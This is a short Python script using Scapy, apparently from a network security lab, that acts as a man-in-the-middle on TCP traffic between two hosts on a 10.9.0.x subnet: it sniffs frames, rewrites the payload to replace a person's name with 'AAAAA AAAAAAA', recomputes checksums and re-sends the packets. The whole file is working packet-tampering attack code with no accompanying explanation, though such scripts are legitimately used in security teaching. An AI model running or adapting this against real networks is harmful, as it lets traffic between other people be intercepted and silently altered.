#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
IP_M = "10.9.0.105"
MAC_M = "02:42:0a:09:00:69"

def spoof_pkt(frame):
    if frame[IP].src == IP_A and frame[IP].dst == IP_B:
        # Create a new packet based on the captured one.
        # 1) We need to delete the checksum in the IP & TCP headers,
        # because our modification will make them invalid.
        # Scapy will recalculate them if these fields are missing.
        # 2) We also delete the original TCP payload.

        new_pkt = IP(bytes(frame[IP]))
        del(new_pkt.chksum)
        del(new_pkt[TCP].payload)
        del(new_pkt[TCP].chksum)

        # Construct the new payload based on the old payload.
        if frame[TCP].payload:
            original_data = frame[TCP].payload.load

            if(b"Harsh Kapadia" in original_data):
                new_data = original_data.replace(b"Harsh Kapadia", b"AAAAA AAAAAAA")
                send(new_pkt/new_data)
            else:
                send(new_pkt/original_data)
        else:
            send(new_pkt)

    elif frame[IP].src == IP_B and frame[IP].dst == IP_A:
        # Create new packet based on the captured one
        new_pkt = IP(bytes(frame[IP]))
        del(new_pkt.chksum)
        del(new_pkt[TCP].chksum)
        send(new_pkt)

def filter_frame(frame):
    if(IP in frame and frame.src != MAC_M):
        return True
    else:
        return False

frame = sniff(iface = "eth0", lfilter = filter_frame, prn = spoof_pkt)
